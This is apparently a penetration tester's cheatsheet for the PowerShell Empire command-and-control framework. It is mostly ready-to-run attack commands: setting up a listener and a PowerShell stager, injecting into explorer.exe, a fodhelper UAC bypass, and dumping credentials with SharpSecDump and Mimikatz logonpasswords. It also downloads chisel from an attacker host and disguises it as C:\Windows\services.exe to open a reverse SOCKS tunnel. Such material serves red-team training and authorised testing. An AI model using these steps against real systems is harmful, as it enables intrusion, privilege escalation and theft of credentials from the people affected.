# Empire

* [https://xakep.ru/2020/06/03/powershell-empire/](https://xakep.ru/2020/06/03/powershell-empire/)




## Install

```
$ git clone --recursive https://github.com/BC-SECURITY/Empire.git
$ cd Empire
$ sudo ./setup/install.sh
$ sudo poetry install
```




## Run

```
$ ./ps-empire server [--restip 127.0.0.1 --username snovvcrash --password 'Passw0rd!']
$ ./ps-empire client
```

Reset the database:

```
$ ./ps-empire server --reset
```




## Cheatsheet

Prepare a listener:

```
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Name http1
(Empire: listeners/http) > set Host 10.10.13.37
(Empire: listeners/http) > set Port 80
(Empire: listeners/http) > execute
```

Generate a PowerShell stager:

```
(Empire: listeners) > usestager multi/launcher
(Empire: stager/multi/launcher) > set Listener http1
(Empire: stager/multi/launcher) > set OutFile /home/snovvcrash/www/rev.ps1
(Empire: stager/multi/launcher) > execute
```

Re-inject into an interactive process (e.g., `explorer.exe`):

```
(Empire: listeners) > agents
(Empire: agents) > rename LKH7SD3V A1
(Empire: agents) > interact A1
(Empire: A1) > sysinfo
(Empire: A1) > shell Get-Process explorer
(Empire: A1) > psinject exch <EXPLORER_EXE_PID>
```

Bypass UAC to get a high integrity process:

```
(Empire: A1) > shell whoami /priv
(Empire: A1) > usemodule privesc/bypassuac_fodhelper
(Empire: powershell/privesc/bypassuac_fodhelper) > set Listener http1
(Empire: powershell/privesc/bypassuac_fodhelper) > run
```

Execute a PowerShell script from memory (e.g., [`Invoke-SharpSecDump.ps1`](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpSecDump.ps1)):

```
(Empire: A1) > shell whoami /priv
(Empire: A1) > usemodule management/invoke_script
(Empire: powershell/management/invoke_script) > set ScriptPath /home/snovvcrash/tools/dump.ps1
(Empire: powershell/management/invoke_script) > set ScriptCmd Invoke-SharpSecDump -C "-tager=127.0.0.1"
(Empire: powershell/management/invoke_script) > run
```

Start a process in the background (e.g., [chisel](https://github.com/jpillora/chisel) SOCKS proxy):

```
(Empire: A1) > shell IWR http://10.10.13.37:8080/chisel.exe -OutFile C:\Windows\services.exe -UseBasicParsing
(Empire: A1) > shell Start-Process -NoNewWindow -FilePath C:\Windows\services.exe -ArgumentList "client 10.10.13.37:8000 R:socks"
```

Invoke a custom Mimikatz command:

```
(Empire: A1) > usemodule credentials/mimikatz/command
(Empire: powershell/credentials/mimikatz/command) > set Command '"privilege::debug" "ts::logonpasswords" "exit"'
(Empire: powershell/credentials/mimikatz/command) > run
```




## Customizing Agents

* [https://s3cur3th1ssh1t.github.io/Customizing_C2_Frameworks/](https://s3cur3th1ssh1t.github.io/Customizing_C2_Frameworks/)
